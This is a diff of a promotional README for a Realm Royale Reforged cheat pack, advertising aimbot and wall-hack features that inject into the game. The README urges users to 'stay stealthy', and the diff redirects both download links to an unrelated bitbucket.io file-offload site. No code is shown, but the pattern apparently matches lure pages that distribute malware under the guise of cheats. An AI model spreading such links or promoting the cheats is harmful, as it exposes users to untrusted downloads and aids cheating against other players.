@@ -4,7 +4,7 @@ Tired of getting clapped by sweaty squads? Wanna go from chicken to champion wit
 
 Whether you're hunting players with precision aimbot or tracking enemies through walls with ESP, this cheat pack turns you into the deadliest warrior across the realm.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://wecheaters.github.io/cheats/realm-royale-reforged/)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🧩 What is the Realm Royale Cheat?
@@ -13,7 +13,7 @@ The **Realm Royale Cheat** is an external or internal software that injects into
 
 This cheat is designed for **Realm Royale Reforged** on PC and works best in casual matches or private lobbies — use smart and stay stealthy! 😉
 
-[![Download Cheat](https://i.ytimg.com/vi/WybcynHwBtI/maxresdefault.jpg)](https://wecheaters.github.io/cheats/realm-royale-reforged/)
+[![Download Cheat](https://i.ytimg.com/vi/WybcynHwBtI/maxresdefault.jpg)](https://fileoffload6.bitbucket.io)
 ---
 
 ## 🛠️ Top Features in the Cheat Pack
